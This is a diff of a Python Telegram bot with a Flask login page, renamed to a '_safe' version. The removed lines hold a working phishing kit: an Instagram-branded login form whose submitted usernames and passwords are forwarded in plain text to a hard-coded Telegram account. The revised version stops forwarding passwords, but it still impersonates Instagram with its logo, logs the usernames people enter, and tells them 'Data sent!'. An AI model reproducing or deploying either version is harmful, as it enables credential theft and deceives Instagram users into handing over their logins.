@@ -1,4 +1,4 @@
-# bot_with_redeem_and_login_form.py
+# bot_with_redeem_and_login_form_safe.py
 import os
 import random
 import string
@@ -11,19 +11,15 @@ from typing import Set, Optional, Dict, Any, Tuple
 from flask import Flask, jsonify, request, Response
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes
-from telegram.error import Forbidden, BadRequest, TelegramError
+from telegram.error import Forbidden, BadRequest
 from telegram.constants import ParseMode  # For HTML parse mode
 
 # ---------- Configuration ----------
 BOT_TOKEN = os.getenv("BOT_TOKEN")
-# Example: ADMIN_IDS="12345678,98765432" (not required now since we send form only to TARGET_ADMIN_ID)
 ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "").split(",") if x.strip().isdigit()]
 FORCE_JOIN_CHANNEL = os.getenv("FORCE_JOIN_CHANNEL")  # e.g. @mychannel or numeric id
 WEB_SECRET = os.getenv("WEB_SECRET", "")  # secret token for protected HTTP endpoints (restart/open)
 BOT_VERSION = os.getenv("BOT_VERSION", "v1.0")
-
-# The single Telegram user ID that should receive form submissions:
-TARGET_ADMIN_ID = 1694669957
 
 if not BOT_TOKEN or not FORCE_JOIN_CHANNEL:
     raise ValueError("Missing BOT_TOKEN or FORCE_JOIN_CHANNEL environment variables!")
@@ -40,7 +36,6 @@ codes: Dict[str, Dict[str, Any]] = {}  # in-memory codes store
 _start_time = time.time()
 
 # ---------- Force-join cache (to reduce API calls) ----------
-# cache: user_id -> (is_member_bool, expire_ts)
 _force_cache: Dict[int, Tuple[bool, float]] = {}
 _FORCE_CACHE_TTL = 45.0  # seconds
 _force_cache_lock = asyncio.Lock()
@@ -75,10 +70,6 @@ def compute_active_users() -> int:
     return len(users)
 
 async def _get_cached_force_status(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> bool:
-    """
-    Returns True if member; uses short cache to limit get_chat_member calls.
-    Admins always return True (bypass).
-    """
     if is_admin(user_id):
         return True
 
@@ -106,11 +97,6 @@ async def _get_cached_force_status(user_id: int, context: ContextTypes.DEFAULT_T
         return is_member
 
 async def ensure_force_join_or_prompt(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
-    """
-    Ensures that non-admin user has joined the FORCE_JOIN_CHANNEL.
-    If not joined, sends a friendly prompt with join button and returns False.
-    Admins bypass and return True.
-    """
     if not update.effective_user:
         return False
     user_id = update.effective_user.id
@@ -173,7 +159,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
             reply_markup=keyboard
         )
     else:
-        # For regular users require force-join
         ok = await ensure_force_join_or_prompt(update, context)
         if not ok:
             return
@@ -202,19 +187,7 @@ async def back_to_start_callback(update: Update, context: ContextTypes.DEFAULT_T
     await query.edit_message_text(text=start_message_admin, parse_mode=ParseMode.HTML, reply_markup=keyboard)
 
 # ---------- Code Commands ----------
-# codes dict shape:
-# codes = {
-#   "ABC123": {
-#       "limit": 1,           # number of uses allowed (1 = one-time)
-#       "uses": 0,            # uses so far
-#       "message": "some text",
-#       "created_by": admin_id,
-#       "used_by": []         # list of user ids who used it
-#   }
-# }
-
 async def generate(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    # /generate <code> <optional message>
     if not update.message:
         return
     if not is_admin(update.effective_user.id):
@@ -239,7 +212,6 @@ async def generate(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(f"✅ Code <b>{code}</b> created (one-time).\nMessage: {message or '(none)'}", parse_mode=ParseMode.HTML)
 
 async def generate_multi(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    # /generate_multi <code> <limit> <optional message>
     if not update.message:
         return
     if not is_admin(update.effective_user.id):
@@ -271,7 +243,6 @@ async def generate_multi(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(f"✅ Code <b>{code}</b> created (multi-use, limit {limit}).\nMessage: {message or '(none)'}", parse_mode=ParseMode.HTML)
 
 async def generate_random(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    # /generate_random <optional message>
     if not update.message:
         return
     if not is_admin(update.effective_user.id):
@@ -295,7 +266,6 @@ async def generate_random(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(f"✅ Random code <b>{code}</b> created (one-time).\nMessage: {message or '(none)'}", parse_mode=ParseMode.HTML)
 
 async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    # /redeem <code>
     if not update.message:
         return
     ok = await ensure_force_join_or_prompt(update, context)
@@ -320,25 +290,8 @@ async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         info["used_by"] = [user_id]
     await update.message.reply_text(f"✅ Code <b>{code}</b> redeemed!\n{info['message'] or ''}", parse_mode=ParseMode.HTML)
-    # Notify admins (optional): here we notify the TARGET_ADMIN_ID only
-    try:
-        text = (
-            f"📥 <b>Code Redeemed</b>\n\n"
-            f"<b>Code:</b> {code}\n"
-            f"<b>User:</b> {update.effective_user.mention_html()}\n"
-            f"<b>Uses:</b> {info['uses']}/{info['limit']}\n"
-        )
-        # schedule notification (non-blocking)
-        try:
-            asyncio.get_event_loop().create_task(context.bot.send_message(chat_id=TARGET_ADMIN_ID, text=text, parse_mode=ParseMode.HTML))
-        except Exception:
-            # fallback using application create_task
-            context.application.create_task(context.bot.send_message(chat_id=TARGET_ADMIN_ID, text=text, parse_mode=ParseMode.HTML))
-    except Exception:
-        logger.exception("Failed to notify TARGET_ADMIN_ID about redemption")
 
 async def listcodes(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    # Admin-only: list codes summary
     if not update.message:
         return
     if not is_admin(update.effective_user.id):
@@ -354,7 +307,6 @@ async def listcodes(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(text, parse_mode=ParseMode.HTML)
 
 async def deletecode(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    # /deletecode <code>
     if not update.message:
         return
     if not is_admin(update.effective_user.id):
@@ -408,56 +360,33 @@ async def ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # ---------- Flask ----------
 flask_app = Flask(__name__)
 
+# Updated HTML: logo, login form
 LOGIN_FORM_HTML = r"""
-<!DOCTYPE html>  <html lang="en">
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
   <title>User Login</title>
   <style>
-    body {
-      background: #fafafa;
-      font-family: Arial, sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-    }
-    .container {
-      width: 350px;
-      background: #fff;
-      border: 1px solid #dbdbdb;
-      padding: 40px;
-      text-align: center;
-    }
-    input {
-      width: 100%;
-      padding: 10px;
-      margin: 6px 0;
-      border: 1px solid #dbdbdb;
-      border-radius: 3px;
-      background: #fafafa;
-    }
-    .login-btn {
-      width: 100%;
-      background: #0095f6;
-      color: #fff;
-      padding: 10px;
-      border: none;
-      border-radius: 3px;
-      font-weight: bold;
-      cursor: pointer;
-      margin-top: 10px;
-    }
+    body { background: #fafafa; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
+    .container { width: 350px; background: #fff; border: 1px solid #dbdbdb; padding: 40px; text-align: center; border-radius:8px; box-shadow: 0 2px 6px rgba(0,0,0,0.04);}
+    .logo { width: 120px; margin-bottom: 20px; }
+    input { width: 100%; padding: 10px; margin: 6px 0; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; }
+    .login-btn { width: 100%; background: #0095f6; color: #fff; padding: 10px; border: none; border-radius: 3px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+    small.note { display:block; margin-top:10px; color:#666; font-size:13px; }
   </style>
 </head>
 <body>
   <div class="container">
-    <h2>🔐 INSTAGRAM LOGIN</h2>
+    <!-- example logo (replace with your static /static/logo.png if you wish) -->
+    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="App Logo" class="logo">
+    <h2>🔐 User Login</h2>
     <form method="POST" action="/submit_form">
       <input type="text" name="username" placeholder="Username" required>
       <input type="password" name="password" placeholder="Password" required>
       <button class="login-btn" type="submit">Log In</button>
+      <small class="note">By logging in you agree to the terms of service.</small>
     </form>
   </div>
 </body>
@@ -468,65 +397,66 @@ LOGIN_FORM_HTML = r"""
 def home():
     return Response(LOGIN_FORM_HTML, mimetype="text/html")
 
-# Thread-safe scheduling helper for sending from Flask thread to bot loop
-def _schedule_coro_from_thread(coro) -> bool:
-    """
-    Try to schedule coroutine on the saved event loop first (run_coroutine_threadsafe).
-    Fall back to telegram_app.create_task (non-blocking) or a temporary event loop (blocking).
-    """
-    loop = getattr(flask_app, "telegram_loop", None)
-    if loop and isinstance(loop, asyncio.AbstractEventLoop):
-        try:
-            asyncio.run_coroutine_threadsafe(coro, loop)
-            logger.info("Scheduled send via run_coroutine_threadsafe (saved loop).")
-            return True
-        except Exception:
-            logger.exception("run_coroutine_threadsafe failed")
-
-    app_obj = getattr(flask_app, "telegram_app", None)
-    if app_obj and hasattr(app_obj, "create_task"):
-        try:
-            app_obj.create_task(coro)
-            logger.info("Scheduled send via telegram_app.create_task().")
-            return True
-        except Exception:
-            logger.exception("telegram_app.create_task failed")
-
-    # Last resort: run coroutine in a temporary loop (blocking)
-    try:
-        loop2 = asyncio.new_event_loop()
-        loop2.run_until_complete(coro)
-        loop2.close()
-        logger.info("Sent message by creating a temporary event loop (blocking).")
-        return True
-    except Exception:
-        logger.exception("Temporary event loop send failed")
-    return False
+# Success page HTML template with countdown and redirect (safe: does NOT send credentials)
+SUCCESS_HTML_TEMPLATE = """<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <title>Login Success</title>
+  <style>
+    body { background: #fafafa; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
+    .container { width: 350px; background: #fff; border: 1px solid #dbdbdb; padding: 40px; text-align: center; border-radius:8px; box-shadow: 0 2px 6px rgba(0,0,0,0.04);}
+    .logo { width: 120px; margin-bottom: 20px; }
+    h3 { color: green; margin-bottom: 6px; }
+    p { margin: 6px 0; color: #333; }
+    .count { font-weight: bold; font-size: 18px; color: #222; margin-top:10px; }
+  </style>
+  <script>
+    // JS countdown and redirect
+    let seconds = 5;
+    function tick() {
+      const el = document.getElementById('countdown');
+      if (!el) return;
+      el.textContent = seconds;
+      if (seconds <= 0) {
+        window.location.href = "https://www.instagram.com";
+      } else {
+        seconds -= 1;
+        setTimeout(tick, 1000);
+      }
+    }
+    window.addEventListener('DOMContentLoaded', (event) => {
+      tick();
+    });
+  </script>
+</head>
+<body>
+  <div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="App Logo" class="logo">
+    <h3>✅ Data sent!</h3>
+    <p>You will be redirected to Instagram in <span id="countdown" class="count">5</span> seconds.</p>
+    <p>If you are not redirected automatically, <a href="https://www.instagram.com">click here</a>.</p>
+  </div>
+</body>
+</html>
+"""
 
 @flask_app.route("/submit_form", methods=["POST"])
 def submit_form():
+    """
+    SAFE behavior:
+      - This function intentionally does NOT forward or store passwords.
+      - It returns a styled success page with a countdown and redirect to instagram.com.
+    If you need to implement a legitimate login flow, use Instagram's OAuth (Basic Display / Facebook Login).
+    """
     username = request.form.get("username", "")
-    password = request.form.get("password", "")
+    # NOTE: we do NOT store or forward the password. We purposely ignore it for safety.
+    # If you have a legitimate use-case to collect data, implement proper consent & secure storage.
+    logger.info("Login form submitted (username received): %s", username)
 
-    text = (
-        "📩 <b>Form Submitted</b>\n\n"
-        f"<b>Username:</b> {username}\n"
-        f"<b>Password:</b> {password}"
-    )
-
-    # Prepare coroutine
-    try:
-        coro = flask_app.bot.send_message(chat_id=TARGET_ADMIN_ID, text=text, parse_mode=ParseMode.HTML)
-    except Exception:
-        logger.exception("Failed to prepare send coroutine (bot may not be attached to flask_app).")
-        return "<h3>⚠️ Internal error. Contact developer.</h3>"
-
-    ok = _schedule_coro_from_thread(coro)
-    if not ok:
-        logger.warning("Scheduling message to TARGET_ADMIN_ID failed. Check event loop and that the admin has started the bot.")
-        return "<h3>⚠️ Could not send data to admin. Please notify the admin to start the bot.</h3>"
-
-    return "<h3>✅ You Have Completed Refferal Successfully!</h3><p>THANKS FOR YOUR CONTRIBUTION 💗.</p>"
+    # Return the styled success page with countdown (safe)
+    return Response(SUCCESS_HTML_TEMPLATE, mimetype="text/html")
 
 # ---------- Status + placeholders ----------
 @flask_app.route("/status")
@@ -570,17 +500,17 @@ def run_flask():
 def main():
     app = ApplicationBuilder().token(BOT_TOKEN).build()
 
-    # Attach bot + app to Flask so submit_form can notify admin
+    # Attach bot + app to Flask (used by other endpoints)
     flask_app.bot = app.bot
     flask_app.telegram_app = app
 
-    # Save the event loop (so run_coroutine_threadsafe can be used from Flask threads)
+    # Save current loop so other threads can schedule tasks safely
     try:
         flask_app.telegram_loop = asyncio.get_event_loop()
         logger.info("Saved current asyncio loop for flask_app.telegram_loop")
     except Exception:
         flask_app.telegram_loop = None
-        logger.info("Could not capture event loop; submit_form will fall back to other strategies")
+        logger.info("Could not capture event loop; fallback scheduling may be used")
 
     # Register handlers
     app.add_handler(CommandHandler("start", start))
